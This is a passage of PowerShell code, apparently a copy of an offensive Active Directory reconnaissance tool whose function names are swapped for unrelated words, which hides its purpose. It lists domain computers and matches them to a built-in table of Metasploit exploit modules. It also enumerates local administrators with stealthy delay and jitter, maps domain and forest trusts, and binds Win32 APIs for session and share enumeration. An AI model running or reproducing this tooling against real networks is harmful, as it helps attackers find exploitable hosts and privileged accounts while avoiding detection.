    summery -FullData @PSBoundParameters | ForEach-Object {

        $CurrentHost = $_.dnshostname
        $CurrentOs = $_.operatingsystem
        $CurrentSp = $_.operatingsystemservicepack
        $CurrentLast = $_.lastlogon
        $CurrentUac = $_.useraccountcontrol

        $CurrentUacBin = [convert]::ToString($_.useraccountcontrol,2)


        $DisableOffset = $CurrentUacBin.Length - 2
        $CurrentDisabled = $CurrentUacBin.Substring($DisableOffset,1)


        if ($CurrentDisabled  -eq 0) {

            $Null = $TableAdsComputers.Rows.Add($CurrentHost,$CurrentOS,$CurrentSP,$CurrentLast)
        }
    }


    Write-Verbose "[*] Loading exploit list for critical missing patches..."






    $TableExploits = New-Object System.Data.DataTable 
    $Null = $TableExploits.Columns.Add('OperatingSystem') 
    $Null = $TableExploits.Columns.Add('ServicePack')
    $Null = $TableExploits.Columns.Add('MsfModule')  
    $Null = $TableExploits.Columns.Add('CVE')
    

    $Null = $TableExploits.Rows.Add("Windows 7","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_070_wkssvc","http://www.cvedetails.com/cve/2006-4691")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/smb/ms05_039_pnp","http://www.cvedetails.com/cve/2005-1983")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2008","Service Pack 2","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103")  
    $Null = $TableExploits.Rows.Add("Windows Server 2008","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $TableExploits.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
    $Null = $TableExploits.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103")  
    $Null = $TableExploits.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $TableExploits.Rows.Add("Windows Server 2008 R2","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $TableExploits.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
    $Null = $TableExploits.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103")  
    $Null = $TableExploits.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $TableExploits.Rows.Add("Windows Vista","Service Pack 2","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103")  
    $Null = $TableExploits.Rows.Add("Windows Vista","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $TableExploits.Rows.Add("Windows Vista","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
    $Null = $TableExploits.Rows.Add("Windows Vista","","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103")  
    $Null = $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
    $Null = $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/")  
    $Null = $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms05_039_pnp","http://www.cvedetails.com/cve/2005-1983")  
    $Null = $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
    $Null = $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
    $Null = $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
    $Null = $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688")  
    $Null = $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_070_wkssvc","http://www.cvedetails.com/cve/2006-4691")  
    $Null = $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
    $Null = $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $TableExploits.Rows.Add("Windows XP","Service Pack 3","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
    $Null = $TableExploits.Rows.Add("Windows XP","Service Pack 3","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $TableExploits.Rows.Add("Windows XP","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $TableExploits.Rows.Add("Windows XP","","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
    $Null = $TableExploits.Rows.Add("Windows XP","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
    $Null = $TableExploits.Rows.Add("Windows XP","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  


    Write-Verbose "[*] Checking computers for vulnerable OS and SP levels..."






    $TableVulnComputers = New-Object System.Data.DataTable 
    $Null = $TableVulnComputers.Columns.Add('ComputerName')
    $Null = $TableVulnComputers.Columns.Add('OperatingSystem')
    $Null = $TableVulnComputers.Columns.Add('ServicePack')
    $Null = $TableVulnComputers.Columns.Add('LastLogon')
    $Null = $TableVulnComputers.Columns.Add('MsfModule')
    $Null = $TableVulnComputers.Columns.Add('CVE')


    $TableExploits | ForEach-Object {
                 
        $ExploitOS = $_.OperatingSystem
        $ExploitSP = $_.ServicePack
        $ExploitMsf = $_.MsfModule
        $ExploitCVE = $_.CVE


        $TableAdsComputers | ForEach-Object {
            
            $AdsHostname = $_.Hostname
            $AdsOS = $_.OperatingSystem
            $AdsSP = $_.ServicePack                                                        
            $AdsLast = $_.LastLogon
            

            if ($AdsOS -like "$ExploitOS*" -and $AdsSP -like "$ExploitSP" ) {                    

                $Null = $TableVulnComputers.Rows.Add($AdsHostname,$AdsOS,$AdsSP,$AdsLast,$ExploitMsf,$ExploitCVE)
            }
        }
    }     
    

    $VulnComputer = $TableVulnComputers | Select-Object ComputerName -Unique | Measure-Object
    $VulnComputerCount = $VulnComputer.Count
    if ($VulnComputer.Count -gt 0) {

        Write-Verbose "[+] Found $VulnComputerCount potentially vulnerable systems!"
        $TableVulnComputers | Sort-Object { $_.lastlogon -as [datetime]} -Descending
    }
    else {
        Write-Verbose "[-] No vulnerable systems were found."
    }
}


function canniness {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $OutFile,

        [Switch]
        $NoClobber,

        [Switch]
        $TrustGroups,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $SearchForest,

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }


        $RandNo = New-Object System.Random

        Write-Verbose "[*] Running canniness with delay of $Delay"


        if($ComputerFile) {
            $ComputerName = Get-Content -Path $ComputerFile
        }

        if(!$ComputerName) { 
            [array]$ComputerName = @()

            if($Domain) {
                $TargetDomains = @($Domain)
            }
            elseif($SearchForest) {

                $TargetDomains = hitter | ForEach-Object { $_.Name }
            }
            else {

                $TargetDomains = @( (Clemens).name )
            }

            ForEach ($Domain in $TargetDomains) {
                Write-Verbose "[*] Querying domain $Domain for hosts"
                $ComputerName += summery -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController
            }
            

            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw "No hosts found!"
            }
        }


        if(!$NoClobber) {
            if ($OutFile -and (Test-Path -Path $OutFile)) { Remove-Item -Path $OutFile }
        }

        if($TrustGroups) {
            
            Write-Verbose "Determining domain trust groups"


            $TrustGroupNames = foregathered -Domain $Domain -DomainController $DomainController | ForEach-Object { $_.GroupName } | Sort-Object -Unique

            $TrustGroupsSIDs = $TrustGroupNames | ForEach-Object { 


                unpinning -Domain $Domain -DomainController $DomainController -GroupName $_ -FullData | Where-Object { $_.objectsid -notmatch "S-1-5-32-544" } | ForEach-Object { $_.objectsid }
            }


            $DomainSID = OKs -Domain $Domain
        }


        $HostEnumBlock = {
            param($ComputerName, $Ping, $OutFile, $DomainSID, $TrustGroupsSIDs)


            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($Up) {

                $LocalAdmins = ghettoes -ComputerName $ComputerName


                if($DomainSID -and $TrustGroupSIDS) {

                    $LocalSID = ($LocalAdmins | Where-Object { $_.SID -match '.*-500$' }).SID -replace "-500$"



                    $LocalAdmins = $LocalAdmins | Where-Object { ($TrustGroupsSIDs -contains $_.SID) -or ((-not $_.SID.startsWith($LocalSID)) -and (-not $_.SID.startsWith($DomainSID))) }
                }

                if($LocalAdmins -and ($LocalAdmins.Length -ne 0)) {

                    if($OutFile) {
                        $LocalAdmins | misconducted -OutFile $OutFile
                    }
                    else {

                        $LocalAdmins
                    }
                }
                else {
                    Write-Verbose "[!] No users returned from $Server"
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose "Using threading with threads = $Threads"


            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
                'OutFile' = $OutFile
                'DomainSID' = $DomainSID
                'TrustGroupsSIDs' = $TrustGroupsSIDs
            }


            acclimatizing -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
        }

        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {

                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = acclimatizing -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose "[*] Total number of active hosts: $($ComputerName.count)"
            $Counter = 0

            ForEach ($Computer in $ComputerName) {

                $Counter = $Counter + 1


                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[*] Enumerating server $Computer ($Counter of $($ComputerName.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $Computer, $False, $OutFile, $DomainSID, $TrustGroupsSIDs
            }
        }
    }
}








function flipped {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $Domain = (Clemens).Name,

        [String]
        $DomainController,

        [Switch]
        $LDAP,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    process {
        if($LDAP -or $DomainController) {

            $TrustSearcher = Garvey -Domain $Domain -DomainController $DomainController -PageSize $PageSize

            if($TrustSearcher) {

                $TrustSearcher.filter = '(&(objectClass=trustedDomain))'

                $TrustSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                    $Props = $_.Properties
                    $DomainTrust = New-Object PSObject
                    $TrustAttrib = Switch ($Props.trustattributes)
                    {
                        0x001 { "non_transitive" }
                        0x002 { "uplevel_only" }
                        0x004 { "quarantined_domain" }
                        0x008 { "forest_transitive" }
                        0x010 { "cross_organization" }
                        0x020 { "within_forest" }
                        0x040 { "treat_as_external" }
                        0x080 { "trust_uses_rc4_encryption" }
                        0x100 { "trust_uses_aes_keys" }
                        Default { 
                            Write-Warning "Unknown trust attribute: $($Props.trustattributes)";
                            "$($Props.trustattributes)";
                        }
                    }
                    $Direction = Switch ($Props.trustdirection) {
                        0 { "Disabled" }
                        1 { "Inbound" }
                        2 { "Outbound" }
                        3 { "Bidirectional" }
                    }
                    $ObjectGuid = New-Object Guid @(,$Props.objectguid[0])
                    $DomainTrust | Add-Member Noteproperty 'SourceName' $Domain
                    $DomainTrust | Add-Member Noteproperty 'TargetName' $Props.name[0]
                    $DomainTrust | Add-Member Noteproperty 'ObjectGuid' "{$ObjectGuid}"
                    $DomainTrust | Add-Member Noteproperty 'TrustType' "$TrustAttrib"
                    $DomainTrust | Add-Member Noteproperty 'TrustDirection' "$Direction"
                    $DomainTrust
                }
            }
        }

        else {

            $FoundDomain = Clemens -Domain $Domain
            
            if($FoundDomain) {
                (Clemens -Domain $Domain).GetAllTrustRelationships()
            }     
        }
    }
}


function freshly {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $Forest
    )

    process {
        $FoundForest = Acapulco -Forest $Forest
        if($FoundForest) {
            $FoundForest.GetAllTrustRelationships()
        }
    }
}


function teamster {


    [CmdletBinding()]
    param(
        [String]
        $UserName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $LDAP,

        [Switch]
        $Recurse,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    function entreat {

        param(
            [String]
            $UserName,

            [String]
            $Domain,

            [String]
            $DomainController,

            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200
        )

        if ($Domain) {

            $DistinguishedDomainName = "DC=" + $Domain -replace '\.',',DC='
        }
        else {
            $DistinguishedDomainName = [String] ([adsi]'').distinguishedname
            $Domain = $DistinguishedDomainName -replace 'DC=','' -replace ',','.'
        }

        irregular -Domain $Domain -DomainController $DomainController -UserName $UserName -PageSize $PageSize | Where-Object {$_.memberof} | ForEach-Object {
            ForEach ($Membership in $_.memberof) {
                $Index = $Membership.IndexOf("DC=")
                if($Index) {
                    
                    $GroupDomain = $($Membership.substring($Index)) -replace 'DC=','' -replace ',','.'
                    
                    if ($GroupDomain.CompareTo($Domain)) {

                        $GroupName = $Membership.split(",")[0].split("=")[1]
                        $ForeignUser = New-Object PSObject
                        $ForeignUser | Add-Member Noteproperty 'UserDomain' $Domain
                        $ForeignUser | Add-Member Noteproperty 'UserName' $_.samaccountname
                        $ForeignUser | Add-Member Noteproperty 'GroupDomain' $GroupDomain
                        $ForeignUser | Add-Member Noteproperty 'GroupName' $GroupName
                        $ForeignUser | Add-Member Noteproperty 'GroupDN' $Membership
                        $ForeignUser
                    }
                }
            }
        }
    }

    if ($Recurse) {

        if($LDAP -or $DomainController) {
            $DomainTrusts = ornately -LDAP -DomainController $DomainController -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
        }
        else {
            $DomainTrusts = ornately -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
        }

        ForEach($DomainTrust in $DomainTrusts) {

            Write-Verbose "Enumerating trust groups in domain $DomainTrust"
            entreat -Domain $DomainTrust -UserName $UserName -PageSize $PageSize
        }
    }
    else {
        entreat -Domain $Domain -DomainController $DomainController -UserName $UserName -PageSize $PageSize
    }
}


function foregathered {


    [CmdletBinding()]
    param(
        [String]
        $GroupName = '*',

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $LDAP,

        [Switch]
        $Recurse,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    function stoppage {
        param(
            [String]
            $GroupName = '*',

            [String]
            $Domain,

            [String]
            $DomainController,

            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200
        )

        if(-not $Domain) {
            $Domain = (Clemens).Name
        }

        $DomainDN = "DC=$($Domain.Replace('.', ',DC='))"
        Write-Verbose "DomainDN: $DomainDN"


        $ExcludeGroups = @("Users", "Domain Users", "Guests")


        unpinning -GroupName $GroupName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | Where-Object {$_.member} | Where-Object {

            -not ($ExcludeGroups -contains $_.samaccountname) } | ForEach-Object {
                
                $GroupName = $_.samAccountName

                $_.member | ForEach-Object {


                    if (($_ -match 'CN=S-1-5-21.*-.*') -or ($DomainDN -ne ($_.substring($_.IndexOf("DC="))))) {

                        $UserDomain = $_.subString($_.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'
                        $UserName = $_.split(",")[0].split("=")[1]

                        $ForeignGroupUser = New-Object PSObject
                        $ForeignGroupUser | Add-Member Noteproperty 'GroupDomain' $Domain
                        $ForeignGroupUser | Add-Member Noteproperty 'GroupName' $GroupName
                        $ForeignGroupUser | Add-Member Noteproperty 'UserDomain' $UserDomain
                        $ForeignGroupUser | Add-Member Noteproperty 'UserName' $UserName
                        $ForeignGroupUser | Add-Member Noteproperty 'UserDN' $_
                        $ForeignGroupUser
                    }
                }
        }
    }

    if ($Recurse) {

        if($LDAP -or $DomainController) {
            $DomainTrusts = ornately -LDAP -DomainController $DomainController -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
        }
        else {
            $DomainTrusts = ornately -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
        }

        ForEach($DomainTrust in $DomainTrusts) {

            Write-Verbose "Enumerating trust groups in domain $DomainTrust"
            stoppage -GroupName $GroupName -Domain $Domain -DomainController $DomainController -PageSize $PageSize
        }
    }
    else {
        stoppage -GroupName $GroupName -Domain $Domain -DomainController $DomainController -PageSize $PageSize
    }
}


function ornately {

    [CmdletBinding()]
    param(
        [Switch]
        $LDAP,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )


    $SeenDomains = @{}


    $Domains = New-Object System.Collections.Stack


    $CurrentDomain = (Clemens).Name
    $Domains.push($CurrentDomain)

    while($Domains.Count -ne 0) {

        $Domain = $Domains.Pop()


        if (-not $SeenDomains.ContainsKey($Domain)) {
            
            Write-Verbose "Enumerating trusts for domain '$Domain'"


            $Null = $SeenDomains.add($Domain, "")

            try {

                if($LDAP -or $DomainController) {
                    $Trusts = flipped -Domain $Domain -LDAP -DomainController $DomainController -PageSize $PageSize
                }
                else {
                    $Trusts = flipped -Domain $Domain -PageSize $PageSize
                }

                if($Trusts -isnot [system.array]) {
                    $Trusts = @($Trusts)
                }


                $Trusts += freshly -Forest $Domain

                if ($Trusts) {


                    ForEach ($Trust in $Trusts) {
                        $SourceDomain = $Trust.SourceName
                        $TargetDomain = $Trust.TargetName
                        $TrustType = $Trust.TrustType
                        $TrustDirection = $Trust.TrustDirection


                        $Null = $Domains.push($TargetDomain)


                        $DomainTrust = New-Object PSObject
                        $DomainTrust | Add-Member Noteproperty 'SourceDomain' "$SourceDomain"
                        $DomainTrust | Add-Member Noteproperty 'TargetDomain' "$TargetDomain"
                        $DomainTrust | Add-Member Noteproperty 'TrustType' "$TrustType"
                        $DomainTrust | Add-Member Noteproperty 'TrustDirection' "$TrustDirection"
                        $DomainTrust
                    }
                }
            }
            catch {
                Write-Warning "[!] Error: $_"
            }
        }
    }
}











$Mod = mewed -ModuleName Win32


$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int])),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(),  [Int32].MakeByRefType())),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType())),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func kernel32 GetLastError ([Int]) @())
)


$WTSConnectState = overthrows $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}


$WTS_SESSION_INFO_1 = Matthew $Mod WTS_SESSION_INFO_1 @{
    ExecEnvId = field 0 UInt32
    State = field 1 $WTSConnectState
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}


$WTS_CLIENT_ADDRESS = Matthew $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}


$SHARE_INFO_1 = Matthew $Mod SHARE_INFO_1 @{
    shi1_netname = field 0 String -MarshalAs @('LPWStr')
    shi1_type = field 1 UInt32
    shi1_remark = field 2 String -MarshalAs @('LPWStr')
}


$WKSTA_USER_INFO_1 = Matthew $Mod WKSTA_USER_INFO_1 @{
    wkui1_username = field 0 String -MarshalAs @('LPWStr')
    wkui1_logon_domain = field 1 String -MarshalAs @('LPWStr')
    wkui1_oth_domains = field 2 String -MarshalAs @('LPWStr')
    wkui1_logon_server = field 3 String -MarshalAs @('LPWStr')
}


$SESSION_INFO_10 = Matthew $Mod SESSION_INFO_10 @{
    sesi10_cname = field 0 String -MarshalAs @('LPWStr')
    sesi10_username = field 1 String -MarshalAs @('LPWStr')
    sesi10_time = field 2 UInt32
    sesi10_idle_time = field 3 UInt32
}


$Types = $FunctionDefinitions | comedowns -Module $Mod -Namespace 'Win32'
$Netapi32 = $Types['netapi32']
$Advapi32 = $Types['advapi32']
$Kernel32 = $Types['kernel32']
$Wtsapi32 = $Types['wtsapi32']
